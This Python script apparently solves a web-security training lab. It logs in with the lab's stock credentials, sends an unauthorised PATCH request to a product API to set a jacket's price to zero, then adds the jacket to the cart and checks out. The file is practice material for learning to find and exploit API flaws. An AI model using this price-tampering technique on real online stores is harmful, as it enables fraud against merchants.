import requests 
from bs4 import BeautifulSoup
from urllib.parse import urlencode

# Login
def lab_login(url):

    # Getting CSRF Token
    s = requests.Session()
    r = s.get(url + "/login")
    p = BeautifulSoup(r.content, "lxml")
    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }

    r = s.post(url + "/login", data=data)

    return s.cookies.get_dict()

# Patch price for Lightweight "l33t" Leather jacket to become 0
def patch_api(url, session):

    data = {
        "price": 0,
        "message": "bigb0ss"
    }
    r = requests.patch(url+"/api/products/1/price", cookies=session, json=data)
    return r.status_code, r.text

def cart_api(url, session):

    data = {
        "productId": 1,
        "redir": "PRODUCT",
        "quantity": 1
    }

    encoded_data = urlencode(data)

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    r = requests.post(url+"/cart", cookies=session, data=encoded_data, headers=headers)
    return r.status_code

def checkout(url, session):

    r = requests.get(url + "/cart", cookies=session)
    p = BeautifulSoup(r.content, "lxml")
    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    data = {
        "csrf": csrf
    }
    r = requests.post(url+"/cart/checkout", data=data, cookies=session)
    return r.status_code

if __name__ == '__main__':
    url = "https://0a3500a50428477983215643005100e9.web-security-academy.net"
    session = lab_login(url)
    print(patch_api(url, session))
    print(cart_api(url, session))
    print(checkout(url, session))

    


